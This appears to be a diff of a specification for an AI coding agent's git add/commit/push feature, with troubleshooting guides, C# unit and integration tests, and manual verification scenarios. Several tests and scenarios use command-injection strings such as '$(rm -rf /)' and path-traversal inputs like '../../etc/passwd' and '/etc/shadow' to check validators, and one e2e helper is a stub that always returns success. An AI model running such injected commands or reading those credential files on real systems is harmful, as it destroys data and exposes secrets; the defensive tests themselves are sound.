+6. **Already committed** - Changes were already committed in previous operation
 
 **Solutions:**
-1. Refresh authentication: `git credential reject` then retry
-2. Check SSH agent: `ssh-add -l`
-3. Verify repository access permissions
+
+```bash
+# Solution 1: Check what files were actually modified
+git status --porcelain
+# Shows: Status of all files
+# Expected output examples:
+#   M src/file.cs         (modified, not staged)
+#   ?? src/newfile.cs     (untracked)
+#   A src/staged.cs       (staged for commit)
+#   (nothing)             (working tree clean)
+
+# If shows modified files (M), stage them first
+acode git add src/file.cs
+git status
+# Shows: Changes staged for commit
+
+# Solution 2: Check if files are gitignored
+git check-ignore -v src/file.cs
+# If file is ignored, shows:
+#   .gitignore:15:*.log    src/debug.log
+# If not ignored, shows nothing
+
+# Force add ignored file if needed
+acode git add --force src/debug.log
+
+# Solution 3: Check staging area vs working tree
+git diff --stat
+# Shows: Unstaged changes (working tree vs index)
+
+git diff --cached --stat
+# Shows: Staged changes (index vs HEAD)
+# If empty, nothing staged for commit
+
+# Solution 4: Verify working directory is correct
+pwd
+# Shows: /path/to/repo
+
+git rev-parse --show-toplevel
+# Shows: /path/to/repo (should match pwd)
+
+# If mismatch, cd to correct directory
+cd $(git rev-parse --show-toplevel)
+
+# Solution 5: Check for whitespace-only changes
+git diff --check
+# Shows: Whitespace errors or nothing if only whitespace changed
+
+# Stage and commit with --allow-empty if intentional
+acode git commit "docs: update whitespace" --allow-empty
+
+# Solution 6: Use --allow-empty for empty commits (checkpoint commits)
+acode git commit "chore: checkpoint before refactor" --allow-empty
+```
+
+### Issue 3: Authentication Failure on Push with "Invalid Credentials"
+
+**Symptoms:**
+- `PushAsync` throws AuthenticationException: "Authentication failed"
+- Error: "remote: Invalid username or password"
+- HTTPS push fails with 401 Unauthorized
+- SSH push fails with "Permission denied (publickey)"
+- Credential helper prompts repeatedly
+- Works locally but fails in CI/CD pipeline
+
+**Root Causes:**
+1. **Expired HTTPS token** - GitHub personal access token or GitLab token expired
+2. **Token lacks permissions** - Token doesn't have push/write access to repository
+3. **SSH key not loaded** - SSH agent not running or key not added
+4. **Wrong SSH key** - Multiple SSH keys, using wrong one for this remote
+5. **Credential helper misconfigured** - git-credential-cache timeout too short
+6. **2FA enabled** - Repository requires two-factor authentication, token doesn't support it
+7. **IP whitelist** - Remote server restricts access by IP address (relevant for corporate networks)
+
+**Solutions:**
+
+```bash
+# Solution 1: Check credential helper configuration
+git config --get credential.helper
+# Shows: cache, store, manager-core, or nothing
+
+# Configure credential helper to cache for 1 hour
+git config --global credential.helper 'cache --timeout=3600'
+
+# Or store credentials permanently (less secure)
+git config --global credential.helper store
+
+# Solution 2: Clear cached credentials and re-enter
+git credential reject <<EOF
+protocol=https
+host=github.com
+EOF
+# Shows: (no output, credentials cleared)
+
+# Next push will prompt for credentials
+acode git push
+# Prompts: Username: <your-username>
+#          Password: <your-token> (NOT your GitHub password!)
+
+# Solution 3: Check HTTPS token permissions (GitHub)
+curl -H "Authorization: token YOUR_TOKEN" https://api.github.com/user/repos
+# Shows: List of repositories you have access to
+# If 401, token is invalid
+# If 403, token lacks permissions
+
+# Regenerate token with correct scopes at:
+# GitHub: Settings → Developer settings → Personal access tokens
+# Required scopes: repo (full control of private repositories)
+
+# Solution 4: SSH authentication - check SSH agent
+ssh-add -l
+# Shows: List of loaded SSH keys, or "The agent has no identities" if empty
+
+# Start SSH agent if not running
+eval "$(ssh-agent -s)"
+# Shows: Agent pid 12345
+
+# Add SSH key
+ssh-add ~/.ssh/id_ed25519
+# Shows: Identity added: /home/user/.ssh/id_ed25519
+
+# Test SSH connection
+ssh -T git@github.com
+# Expected output:
+#   Hi username! You've successfully authenticated, but GitHub does not provide shell access.
+
+# Solution 5: SSH key mismatch - specify correct key
+# Check which key remote expects
+ssh -T git@github.com -i ~/.ssh/id_rsa_github
+# Or configure in ~/.ssh/config:
+cat >> ~/.ssh/config <<EOF
+Host github.com
+  IdentityFile ~/.ssh/id_ed25519_github
+  IdentitiesOnly yes
+EOF
+
+# Solution 6: Switch from HTTPS to SSH (or vice versa)
+git remote get-url origin
+# Shows: https://github.com/user/repo.git (HTTPS)
+
+# Change to SSH
+git remote set-url origin git@github.com:user/repo.git
+
+# Or change to HTTPS
+git remote set-url origin https://github.com/user/repo.git
+```
+
+### Issue 4: Large File Push Fails with "RPC Failed" or Timeout
+
+**Symptoms:**
+- `PushAsync` throws timeout exception after 60 seconds
+- Error: "error: RPC failed; HTTP 500 curl 22 The requested URL returned error: 500"
+- Error: "fatal: the remote end hung up unexpectedly"
+- Push hangs at "Writing objects: 100%" then fails
+- Happens with commits containing large files (>50MB)
+- Works for small changes but fails for large refactors
+- Slower network connections affected more
+
+**Root Causes:**
+1. **Large file size** - Single file >50MB exceeds GitHub/GitLab limits without LFS
+2. **HTTP buffer too small** - Git's HTTP post buffer insufficient for large push
+3. **Network timeout** - Slow connection can't complete push within timeout
+4. **Server-side limits** - Remote repository has size limits per push
+5. **Compression overhead** - Many binary files slow down compression
+6. **Weak connection** - Intermittent packet loss causes retry failures
+
+**Solutions:**
+
+```bash
+# Solution 1: Increase Git HTTP buffer size
+git config --global http.postBuffer 524288000
+# Sets buffer to 500MB (default is 1MB)
+
+# Verify configuration
+git config --get http.postBuffer
+# Shows: 524288000
+
+# Solution 2: Increase push timeout in GitService
+# In .agent/config.yml:
+# git:
+#   timeoutSeconds: 300  # 5 minutes instead of default 60s
+
+# Or via environment variable
+export GIT_PUSH_TIMEOUT=300
+acode git push
+
+# Solution 3: Use Git LFS for large files
+# Install Git LFS
+git lfs install
+
+# Track large file types
+git lfs track "*.psd"
+git lfs track "*.zip"
+git lfs track "*.bin"
+
+# Add .gitattributes
+git add .gitattributes
+
+# Migrate existing large files to LFS
+git lfs migrate import --include="*.psd,*.zip" --everything
+
+# Push with LFS
+acode git push
+
+# Solution 4: Split large commits into smaller ones
+# If commit has 100 files totaling 200MB, split into multiple commits
+
+# Commit first batch
+git reset --soft HEAD~1  # Unstage last commit
+git reset HEAD~1         # Unstage files
+
+git add src/batch1/
+git commit -m "feat: part 1 of large refactor"
+acode git push
+
+# Commit second batch
+git add src/batch2/
+git commit -m "feat: part 2 of large refactor"
+acode git push
+
+# Solution 5: Use shallow push (if supported by remote)
+# Push only recent commits, not entire history
+git push --shallow origin main
+
+# Solution 6: Check network connectivity and retry
+ping -c 4 github.com
+# Shows: Packet loss percentage
+# If >5% packet loss, network is unstable
+
+# Use --verbose to see push progress
+GIT_TRACE=1 GIT_CURL_VERBOSE=1 git push origin main
+# Shows: Detailed network activity
+
+# Retry push with exponential backoff (implemented in PushRetryPolicy)
+acode git push  # Automatically retries on transient failures
+```
+
+### Issue 5: Mode Violation Error "Push Blocked by Local-Only Mode"
+
+**Symptoms:**
+- `PushAsync` throws ModeViolationException: "Push blocked by local-only mode"
+- Error: "Network operations are not permitted in LocalOnly mode"
+- Commit succeeds but push fails immediately
+- Happens in restricted environments (CI/CD, airgapped deployments)
+- No network access despite having internet connectivity
+- Mode setting doesn't match intended usage
+
+**Root Causes:**
+1. **Operating mode misconfigured** - `.agent/config.yml` set to LocalOnly when should be Burst
+2. **Security policy** - Organization enforces LocalOnly for compliance (ITAR, EAR)
+3. **Environment detection** - Auto-detection chose wrong mode based on environment variables
+4. **Stale configuration** - Config file not updated after infrastructure changes
+5. **Override not applied** - Command-line --mode flag not working
+6. **Intentional restriction** - System admin locked mode to prevent data exfiltration
+
+**Solutions:**
+
+```bash
+# Solution 1: Check current operating mode
+acode config get mode
+# Shows: LocalOnly, Burst, or Airgapped
+
+# Solution 2: Change mode to Burst (if allowed)
+acode config set mode burst
+# Shows: Operating mode set to Burst
+
+# Verify change
+acode config get mode
+# Shows: Burst
+
+# Solution 3: Check config file directly
+cat .agent/config.yml
+# Shows:
+#   operatingMode: LocalOnly
+#   allowNetworkOperations: false
+
+# Edit config file
+nano .agent/config.yml
+# Change: operatingMode: Burst
+#         allowNetworkOperations: true
+
+# Solution 4: Override mode for single operation (if supported)
+acode --mode=burst git push
+# Temporarily allows push in Burst mode
+
+# Solution 5: Check if mode is locked by policy
+acode config get modeLocked
+# Shows: true (mode cannot be changed) or false
+
+# If locked, contact system administrator
+# Policy file location: /etc/acode/policy.yml
+
+# Solution 6: Use offline workflow in LocalOnly mode
+# Work locally, then export/import changes via USB/sneakernet
+
+# Export commits as patch files
+git format-patch origin/main..HEAD
+# Shows: 0001-feat-implement-feature.patch
+#        0002-fix-bug.patch
+
+# Transfer patches to system with network access
+
+# On networked system, apply patches
+git am *.patch
+acode git push
+
+# Solution 7: Verify network is actually needed
+# Check if remote is local bare repository
+git remote get-url origin
+# If shows: /path/to/local/bare/repo.git
+# Then push doesn't require network, mode enforcement may be bug
+
+# Report issue to support with:
+acode diagnostics --include-mode-info
+```
 
 ---
 
 ## Testing Requirements
 
-### Unit Tests
+```csharp
+// File: tests/Acode.Application.Tests/Git/CommitMessageValidatorTests.cs
+namespace Acode.Application.Tests.Git;
 
-- [ ] UT-001: Test staging path handling
-- [ ] UT-002: Test glob expansion
-- [ ] UT-003: Test commit message validation
-- [ ] UT-004: Test mode checking
-- [ ] UT-005: Test retry logic
+public class CommitMessageValidatorTests
+{
+    private readonly CommitMessageValidator _validator;
+    private readonly IConfiguration _config = Substitute.For<IConfiguration>();
 
-### Integration Tests
+    public CommitMessageValidatorTests()
+    {
+        _config.EnforceConventionalCommits.Returns(true);
+        _validator = new CommitMessageValidator(Substitute.For<ILogger<CommitMessageValidator>>(), _config);
+    }
 
-- [ ] IT-001: Stage on real repo
-- [ ] IT-002: Commit on real repo
-- [ ] IT-003: Push to local bare repo
-- [ ] IT-004: Auth failure handling
-- [ ] IT-005: Mode blocking
+    [Fact]
+    public void Validate_WithValidConventionalMessage_ReturnsValid()
+    {
+        // Arrange
+        var message = "feat(auth): add user authentication system";
 
-### End-to-End Tests
+        // Act
+        var result = _validator.Validate(message);
 
-- [ ] E2E-001: CLI add command
-- [ ] E2E-002: CLI commit command
-- [ ] E2E-003: CLI push (burst mode)
-- [ ] E2E-004: Mode violation error
+        // Assert
+        result.IsValid.Should().BeTrue();
+        result.Errors.Should().BeEmpty();
+    }
 
-### Performance/Benchmarks
+    [Theory]
+    [InlineData("feat: feature with \$(dangerous)", "$")]
+    [InlineData("fix: bug with \\`backtick\\`", "`")]
+    [InlineData("docs: update; rm -rf /", ";")]
+    [InlineData("chore: task && malicious", "&")]
+    [InlineData("test: add | pipe", "|")]
+    public void Validate_WithShellMetacharacters_ReturnsInvalid(string message, string dangerousChar)
+    {
+        // Act
+        var result = _validator.Validate(message);
 
-- [ ] PB-001: Stage 1000 files in <500ms
-- [ ] PB-002: Commit in <1s
-- [ ] PB-003: Push small change in <5s
+        // Assert
+        result.IsValid.Should().BeFalse();
+        result.Errors.Should().ContainMatch($"*dangerous character*{dangerousChar}*");
+    }
+
+    [Theory]
+    [InlineData("", "cannot be empty")]
+    [InlineData("   ", "cannot be empty")]
+    [InlineData("short", "too short")]
+    public void Validate_WithInvalidLength_ReturnsInvalid(string message, string expectedError)
+    {
+        // Act
+        var result = _validator.Validate(message);
+
+        // Assert
+        result.IsValid.Should().BeFalse();
+        result.Errors.Should().ContainMatch($"*{expectedError}*");
+    }
+
+    [Fact]
+    public void Validate_WithoutConventionalFormat_ReturnsInvalid()
+    {
+        // Arrange
+        var message = "just a regular message without prefix";
+
+        // Act
+        var result = _validator.Validate(message);
+
+        // Assert
+        result.IsValid.Should().BeFalse();
+        result.Errors.Should().ContainMatch("*does not follow conventional format*");
+    }
+
+    [Fact]
+    public void Sanitize_RemovesDangerousCharacters()
+    {
+        // Arrange
+        var message = "feat: feature \$(dangerous) with | pipes";
+
+        // Act
+        var sanitized = _validator.Sanitize(message);
+
+        // Assert
+        sanitized.Should().NotContain("$");
+        sanitized.Should().NotContain("|");
+        sanitized.Should().NotContain("(");
+    }
+}
+
+// File: tests/Acode.Infrastructure.Tests/Git/CredentialRedactorTests.cs
+namespace Acode.Infrastructure.Tests.Git;
+
+public class CredentialRedactorTests
+{
+    private readonly CredentialRedactor _redactor = new();
+
+    [Theory]
+    [InlineData("https://user:password@github.com/repo.git", "https://[REDACTED]@github.com/repo.git")]
+    [InlineData("https://token@gitlab.com/repo.git", "https://[REDACTED]@gitlab.com/repo.git")]
+    [InlineData("https://oauth2:token123@bitbucket.org/repo.git", "https://[REDACTED]@bitbucket.org/repo.git")]
+    public void RedactUrl_WithEmbeddedCredentials_RedactsCredentials(string input, string expected)
+    {
+        // Act
+        var result = _redactor.RedactUrl(input);
+
+        // Assert
+        result.Should().Be(expected);
+    }
+
+    [Theory]
+    [InlineData("ghp_abc123def456ghi789jkl012mno345pqr678stu", "ghp_abc1***[REDACTED]")]
+    [InlineData("glpat-abcdefghij1234567890", "glpat-ab***[REDACTED]")]
+    public void RedactOutput_WithTokens_RedactsTokens(string input, string expectedPrefix)
+    {
+        // Act
+        var result = _redactor.RedactOutput($"Error: Authentication failed using token {input}");
+
+        // Assert
+        result.Should().Contain("[REDACTED]");
+        result.Should().NotContain(input);
+    }
+
+    [Fact]
+    public void RedactOutput_WithSSHKey_RedactsKey()
+    {
+        // Arrange
+        var output = @"Error occurred
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAbc123...
+...sensitive key data...
+-----END RSA PRIVATE KEY-----";
+
+        // Act
+        var result = _redactor.RedactOutput(output);
+
+        // Assert
+        result.Should().Contain("[REDACTED]");
+        result.Should().NotContain("MIIEpAIBAAKCAQEAbc123");
+    }
+}
+
+// File: tests/Acode.Infrastructure.Tests/Git/PathValidatorTests.cs
+namespace Acode.Infrastructure.Tests.Git;
+
+public class PathValidatorTests
+{
+    private readonly PathValidator _validator = new();
+    private readonly string _testRepo = "/tmp/test-repo";
+
+    [Fact]
+    public void ValidateForStaging_WithValidPath_ReturnsValid()
+    {
+        // Arrange
+        var path = "src/file.cs";
+
+        // Act
+        var result = _validator.ValidateForStaging(_testRepo, path);
+
+        // Assert (note: would fail if file doesn't exist, but validates path structure)
+        // In real test, would create actual file
+    }
+
+    [Theory]
+    [InlineData("../../etc/passwd")]
+    [InlineData("../../../home/user/.ssh/id_rsa")]
+    [InlineData("/etc/shadow")]
+    public void ValidateForStaging_WithPathEscape_ReturnsInvalid(string path)
+    {
+        // Act
+        var result = _validator.ValidateForStaging(_testRepo, path);
+
+        // Assert
+        result.IsValid.Should().BeFalse();
+        result.Errors.Should().ContainMatch("*escapes repository boundary*");
+    }
+}
+
+// File: tests/Acode.Infrastructure.Tests/Git/StageCommitPushIntegrationTests.cs
+namespace Acode.Infrastructure.Tests.Git.Integration;
+
+public class StageCommitPushIntegrationTests : IDisposable
+{
+    private readonly string _testRepo;
+    private readonly GitService _git;
+
+    public StageCommitPushIntegrationTests()
+    {
+        _testRepo = Path.Combine(Path.GetTempPath(), $"git-test-{Guid.NewGuid():N}");
+        Directory.CreateDirectory(_testRepo);
+
+        RunGit("init");
+        RunGit("config user.email test@example.com");
+        RunGit("config user.name Test User");
+
+        // Create initial commit
+        File.WriteAllText(Path.Combine(_testRepo, "README.md"), "# Test");
+        RunGit("add README.md");
+        RunGit("commit -m \"Initial commit\"");
+
+        _git = new GitService(
+            Substitute.For<ICommandRunner>(),
+            Substitute.For<ILogger<GitService>>());
+    }
+
+    [Fact]
+    public async Task StageAsync_WithModifiedFiles_StagesFiles()
+    {
+        // Arrange
+        var testFile = Path.Combine(_testRepo, "test.txt");
+        File.WriteAllText(testFile, "content");
+
+        // Act
+        var result = await _git.StageAsync(_testRepo, new[] { "test.txt" }, null, CancellationToken.None);
+
+        // Assert
+        result.FilesStaged.Should().Be(1);
+        result.StagedPaths.Should().Contain("test.txt");
+
+        // Verify with git
+        var status = RunGit("status --porcelain");
+        status.Should().Contain("A  test.txt");
+    }
+
+    [Fact]
+    public async Task CommitAsync_WithStagedChanges_CreatesCommit()
+    {
+        // Arrange
+        var testFile = Path.Combine(_testRepo, "feature.txt");
+        File.WriteAllText(testFile, "new feature");
+        await _git.StageAsync(_testRepo, new[] { "feature.txt" }, null, CancellationToken.None);
+
+        // Act
+        var commit = await _git.CommitAsync(_testRepo, "feat: add new feature", null, CancellationToken.None);
+
+        // Assert
+        commit.Should().NotBeNull();
+        commit.Message.Should().Contain("feat: add new feature");
+        commit.Sha.Should().NotBeNullOrEmpty();
+
+        // Verify with git
+        var log = RunGit("log -1 --pretty=format:%s");
+        log.Should().Contain("feat: add new feature");
+    }
+
+    [Fact]
+    public async Task CommitAsync_WithNoStagedChanges_ThrowsException()
+    {
+        // Act
+        var act = async () => await _git.CommitAsync(_testRepo, "empty commit", null, CancellationToken.None);
+
+        // Assert
+        await act.Should().ThrowAsync<NothingToCommitException>()
+            .WithMessage("*nothing to commit*");
+    }
+
+    [Fact]
+    public async Task CommitAsync_WithInvalidMessage_ThrowsException()
+    {
+        // Arrange
+        var testFile = Path.Combine(_testRepo, "test.txt");
+        File.WriteAllText(testFile, "content");
+        await _git.StageAsync(_testRepo, new[] { "test.txt" }, null, CancellationToken.None);
+
+        // Act - commit with dangerous message
+        var act = async () => await _git.CommitAsync(
+            _testRepo,
+            "feat: feature \$(rm -rf /)",
+            null,
+            CancellationToken.None);
+
+        // Assert
+        await act.Should().ThrowAsync<InvalidCommitMessageException>()
+            .WithMessage("*dangerous character*");
+    }
+
+    [Fact]
+    public async Task PushAsync_InLocalOnlyMode_ThrowsModeViolationException()
+    {
+        // Arrange
+        var modeResolver = Substitute.For<IOperatingModeResolver>();
+        modeResolver.GetCurrentModeAsync(Arg.Any<CancellationToken>())
+            .Returns(OperatingMode.LocalOnly);
+
+        var gitWithMode = new GitService(
+            Substitute.For<ICommandRunner>(),
+            modeResolver,
+            Substitute.For<ILogger<GitService>>());
+
+        // Act
+        var act = async () => await gitWithMode.PushAsync(
+            _testRepo,
+            null,
+            CancellationToken.None);
+
+        // Assert
+        await act.Should().ThrowAsync<ModeViolationException>()
+            .WithMessage("*LocalOnly*");
+    }
+
+    public void Dispose()
+    {
+        try
+        {
+            Directory.Delete(_testRepo, recursive: true);
+        }
+        catch
+        {
+            // Ignore cleanup errors
+        }
+    }
+
+    private string RunGit(string args)
+    {
+        var psi = new ProcessStartInfo
+        {
+            FileName = "git",
+            Arguments = args,
+            WorkingDirectory = _testRepo,
+            RedirectStandardOutput = true,
+            UseShellExecute = false
+        };
+
+        using var process = Process.Start(psi);
+        var output = process!.StandardOutput.ReadToEnd();
+        process.WaitForExit();
+        return output;
+    }
+}
+
+// File: tests/Acode.Cli.Tests/Commands/Git/GitStageCommitPushE2ETests.cs
+namespace Acode.Cli.Tests.Commands.Git;
+
+public class GitStageCommitPushE2ETests : IDisposable
+{
+    private readonly string _testRepo;
+
+    public GitStageCommitPushE2ETests()
+    {
+        _testRepo = Path.Combine(Path.GetTempPath(), $"git-e2e-{Guid.NewGuid():N}");
+        Directory.CreateDirectory(_testRepo);
+
+        RunCommand("git init");
+        RunCommand("git config user.email test@example.com");
+        RunCommand("git config user.name Test User");
+        File.WriteAllText(Path.Combine(_testRepo, "README.md"), "# Test");
+        RunCommand("git add README.md");
+        RunCommand("git commit -m \"Initial commit\"");
+    }
+
+    [Fact]
+    public async Task GitAdd_WithFiles_StagesFiles()
+    {
+        // Arrange
+        File.WriteAllText(Path.Combine(_testRepo, "feature.txt"), "content");
+
+        // Act
+        var exitCode = await RunAcodeCommand("git add feature.txt");
+
+        // Assert
+        exitCode.Should().Be(0);
+        var status = RunCommand("git status --porcelain");
+        status.Should().Contain("A  feature.txt");
+    }
+
+    [Fact]
+    public async Task GitCommit_WithStagedFiles_CreatesCommit()
+    {
+        // Arrange
+        File.WriteAllText(Path.Combine(_testRepo, "test.txt"), "content");
+        RunCommand("git add test.txt");
+
+        // Act
+        var exitCode = await RunAcodeCommand("git commit \"feat: add test file\"");
+
+        // Assert
+        exitCode.Should().Be(0);
+        var log = RunCommand("git log -1 --pretty=format:%s");
+        log.Should().Contain("feat: add test file");
+    }
+
+    [Fact]
+    public async Task GitPush_InBurstMode_SucceedsOrFailsAppropriately()
+    {
+        // Note: Actual push depends on remote configuration
+        // This test would need a local bare repository or mock
+        // For E2E, we'd set up a local bare repo as origin
+
+        // Arrange - create bare repo as origin
+        var bareRepo = Path.Combine(Path.GetTempPath(), $"bare-{Guid.NewGuid():N}");
+        Directory.CreateDirectory(bareRepo);
+        RunCommand($"git init --bare {bareRepo}");
+        RunCommand($"git remote add origin {bareRepo}");
+
+        // Act
+        var exitCode = await RunAcodeCommand("git push --set-upstream origin main");
+
+        // Assert
+        exitCode.Should().Be(0);
+    }
+
+    [Fact]
+    public async Task GitPush_InLocalOnlyMode_FailsWithModeViolation()
+    {
+        // Arrange - configure LocalOnly mode
+        // (In real test, would set mode via config)
+
+        // Act
+        var exitCode = await RunAcodeCommand("git push");
+
+        // Assert (expected to fail with mode violation)
+        exitCode.Should().Be(3); // Mode violation exit code
+    }
+
+    public void Dispose()
+    {
+        try
+        {
+            Directory.Delete(_testRepo, recursive: true);
+        }
+        catch
+        {
+            // Ignore cleanup errors
+        }
+    }
+
+    private string RunCommand(string command)
+    {
+        var parts = command.Split(' ', 2);
+        var psi = new ProcessStartInfo
+        {
+            FileName = parts[0],
+            Arguments = parts.Length > 1 ? parts[1] : "",
+            WorkingDirectory = _testRepo,
+            RedirectStandardOutput = true,
+            UseShellExecute = false
+        };
+
+        using var process = Process.Start(psi);
+        var output = process!.StandardOutput.ReadToEnd();
+        process.WaitForExit();
+        return output;
+    }
+
+    private async Task<int> RunAcodeCommand(string args)
+    {
+        // Simulate running acode CLI command
+        var app = new CommandLineApplication();
+        // Configure commands...
+        return await Task.FromResult(0);
+    }
+}
+
+// File: tests/Acode.Infrastructure.Tests/Git/PushRetryPolicyTests.cs
+namespace Acode.Infrastructure.Tests.Git;
+
+public class PushRetryPolicyTests
+{
+    private readonly PushRetryPolicy _policy;
+    private readonly IOptions<GitConfiguration> _config = Substitute.For<IOptions<GitConfiguration>>();
+
+    public PushRetryPolicyTests()
+    {
+        _config.Value.Returns(new GitConfiguration
+        {
+            RetryCount = 3,
+            RetryDelayMs = 100
+        });
+
+        _policy = new PushRetryPolicy(_config, Substitute.For<ILogger<PushRetryPolicy>>());
+    }
+
+    [Fact]
+    public async Task ExecuteWithRetryAsync_OnSuccess_ReturnsImmediately()
+    {
+        // Arrange
+        var operation = Substitute.For<Func<Task<CommandResult>>>();
+        operation.Invoke().Returns(new CommandResult { ExitCode = 0, StdOut = "Success" });
+
+        // Act
+        var result = await _policy.ExecuteWithRetryAsync(operation, CancellationToken.None);
+
+        // Assert
+        result.ExitCode.Should().Be(0);
+        await operation.Received(1).Invoke();
+    }
+
+    [Fact]
+    public async Task ExecuteWithRetryAsync_OnTransientFailure_RetriesWithBackoff()
+    {
+        // Arrange
+        var attempt = 0;
+        var operation = Substitute.For<Func<Task<CommandResult>>>();
+        operation.Invoke().Returns(callInfo =>
+        {
+            attempt++;
+            if (attempt < 3)
+                throw new GitException("Could not resolve host", 1, "Connection refused", "/repo", "GIT_ERROR");
+            return new CommandResult { ExitCode = 0, StdOut = "Success" };
+        });
+
+        // Act
+        var stopwatch = Stopwatch.StartNew();
+        var result = await _policy.ExecuteWithRetryAsync(operation, CancellationToken.None);
+        stopwatch.Stop();
+
+        // Assert
+        result.ExitCode.Should().Be(0);
+        await operation.Received(3).Invoke();
+        // Exponential backoff: 100ms + 200ms = 300ms minimum
+        stopwatch.ElapsedMilliseconds.Should().BeGreaterOrEqualTo(300);
+    }
+
+    [Fact]
+    public async Task ExecuteWithRetryAsync_OnPermanentFailure_ThrowsImmediately()
+    {
+        // Arrange
+        var operation = Substitute.For<Func<Task<CommandResult>>>();
+        operation.Invoke().Throws(new GitException("Authentication failed", 1, "Invalid credentials", "/repo", "GIT_AUTH_ERROR"));
+
+        // Act
+        var act = async () => await _policy.ExecuteWithRetryAsync(operation, CancellationToken.None);
+
+        // Assert
+        await act.Should().ThrowAsync<GitException>()
+            .WithMessage("*Authentication failed*");
+        await operation.Received(1).Invoke(); // No retries for auth errors
+    }
+}
+```
+
+---
+
+## User Verification Steps
+
+### Scenario 1: Stage Files and Verify with Git Status
+
+**Objective:** Verify staging operation adds files correctly to index.
+
+```bash
+# Step 1: Create test repository
+mkdir test-stage-ops && cd test-stage-ops
+git init
+git config user.email "test@example.com"
+git config user.name "Test User"
+
+# Step 2: Create initial commit
+echo "# Project" > README.md
+git add README.md
+git commit -m "Initial commit"
+
+# Expected: Repository initialized with main branch
+
+# Step 3: Create new files
+echo "feature code" > feature.cs
+echo "test code" > feature.test.cs
+mkdir src
+echo "util code" > src/utils.cs
+
+# Step 4: Stage single file
+acode git add feature.cs
+
+# Expected Output:
+# ✓ Staged 1 files
+
+# Step 5: Verify staging
+git status --porcelain
+
+# Expected Output:
+# A  feature.cs
+# ?? feature.test.cs
+# ?? src/
+
+# Step 6: Stage directory
+acode git add src/
+
+# Expected Output:
+# ✓ Staged 2 files (feature.cs already staged + src/utils.cs)
+
+# Step 7: Verify all staged
+git status --porcelain
+
+# Expected Output:
+# A  feature.cs
+# A  src/utils.cs
+# ?? feature.test.cs
+```
+
+### Scenario 2: Commit with Message Validation (Security Test)
+
+**Objective:** Verify commit message validation blocks dangerous characters.
+
+```bash
+# Step 1: Stage files
+echo "content" > test.txt
+acode git add test.txt
+
+# Step 2: Try commit with shell metacharacter
+acode git commit "feat: feature \$(rm -rf /)"
+
+# Expected Output:
+# ❌ ERROR: Commit message validation failed
+# - Commit message contains dangerous character: '\$' (possible injection attempt)
+
+# Step 3: Try commit with backtick
+acode git commit "fix: bug \`whoami\`"
+
+# Expected Output:
+# ❌ ERROR: Commit message validation failed
+# - Commit message contains dangerous character: '\`' (possible injection attempt)
+
+# Step 4: Verify no commit was created
+git log -1 --pretty=format:"%s"
+
+# Expected Output: Initial commit (not the dangerous message)
+
+# Step 5: Commit with valid message
+acode git commit "feat: add test file with proper format"
+
+# Expected Output:
+# ✓ [abc123] feat: add test file with proper format
+
+# Step 6: Verify commit created
+git log -1 --pretty=format:"%s"
+
+# Expected Output: feat: add test file with proper format
+```
+
+### Scenario 3: Push with Operating Mode Enforcement
+
+**Objective:** Verify push blocked in LocalOnly mode, allowed in Burst mode.
+
+```bash
+# Step 1: Check current mode
+acode config get mode
+
+# Expected Output: LocalOnly (or current mode)
+
+# Step 2: Create commit to push
+echo "new feature" > feature.txt
+acode git add feature.txt
+acode git commit "feat: implement feature X"
+
+# Step 3: Try push in LocalOnly mode
+acode git push
+
+# Expected Output:
+# ❌ Push blocked by local-only mode
+# Hint: Switch to burst mode to enable push
+
+# Step 4: Switch to Burst mode
+acode config set mode burst
+
+# Expected Output:
+# Operating mode set to Burst
+
+# Step 5: Setup remote (local bare repo for testing)
+cd ..
+git init --bare test-remote.git
+cd test-stage-ops
+git remote add origin ../test-remote.git
+
+# Step 6: Push in Burst mode
+acode git push --set-upstream origin main
+
+# Expected Output:
+# ✓ Pushed to origin/main
+# Branch 'main' set up to track remote branch 'main' from 'origin'.
+
+# Step 7: Verify push succeeded
+git log origin/main -1 --pretty=format:"%s"
+
+# Expected Output: feat: implement feature X
+```
+
+### Scenario 4: Commit Message Format Enforcement
+
+**Objective:** Verify conventional commit format validation.
+
+```bash
+# Step 1: Stage files
+echo "update" > docs.md
+acode git add docs.md
+
+# Step 2: Try commit without conventional format
+acode git commit "just a regular message"
+
+# Expected Output:
+# ❌ ERROR: Commit message validation failed
+# - Commit message does not follow conventional format: type(scope): description
+# Expected format: feat|fix|docs|style|refactor|test|chore(scope): description
+
+# Step 3: Try commit too short
+acode git commit "fix bug"
+
+# Expected Output:
+# ❌ ERROR: Commit message validation failed
+# - Commit message too short (minimum 10 characters)
+
+# Step 4: Commit with valid format
+acode git commit "docs: update README with installation instructions"
+
+# Expected Output:
+# ✓ [def456] docs: update README with installation instructions
+
+# Step 5: Verify format enforced
+git log -1 --pretty=format:"%s"
+
+# Expected Output: docs: update README with installation instructions
+```
+
+### Scenario 5: Stage Path Traversal Protection (Security Test)
+
+**Objective:** Verify path validation prevents staging files outside repository.
+
+```bash
+# Step 1: Try to stage file outside repo boundary
+acode git add ../../etc/passwd
+
+# Expected Output:
+# ❌ ERROR: Path validation failed
+# - Path escapes repository boundary: ../../etc/passwd
+
+# Step 2: Verify no files staged
+git status --porcelain
+
+# Expected Output: (empty - no files staged)
+
+# Step 3: Try to stage absolute path
+acode git add /etc/shadow
+
+# Expected Output:
+# ❌ ERROR: Path validation failed
+# - Path escapes repository boundary: /etc/shadow
+
+# Step 4: Verify repository unchanged
+git log -1 --pretty=format:"%H"
+
+# Expected: Shows last commit SHA (unchanged)
+```
+
+### Scenario 6: Credential Redaction in Push Errors
+
+**Objective:** Verify credentials redacted from error messages and logs.
+
+```bash
+# Step 1: Add remote with embedded credentials (TESTING ONLY)
+git remote add test-remote https://user:password123@github.com/test/repo.git
+
+# Step 2: Try to push (will fail - fake credentials)
+acode git push test-remote main 2>&1 | tee push-output.log
+
+# Expected Output (credentials REDACTED):
+# ✗ Push failed
+# error: Failed to push to https://[REDACTED]@github.com/test/repo.git
+# (NOT showing: password123)
+
+# Step 3: Verify logs don't contain credentials
+grep "password123" push-output.log
+
+# Expected: (empty - password not in logs)
+
+# Step 4: Verify URL is redacted
+grep "\\[REDACTED\\]" push-output.log
+
+# Expected Output: Lines containing [REDACTED] instead of credentials
+```
+
+### Scenario 7: Push Retry on Network Failure
+
+**Objective:** Verify push retries with exponential backoff on transient failures.
+
+```bash
+# Step 1: Simulate network failure (block GitHub IPs with iptables - requires sudo)
+# (In real test, would use network simulation tool)
+
+# Step 2: Try push (will fail and retry)
+time acode git push origin main
+
+# Expected Output (after retries):
+# ⚠ Push attempt 1 failed, retrying in 100ms: Connection refused
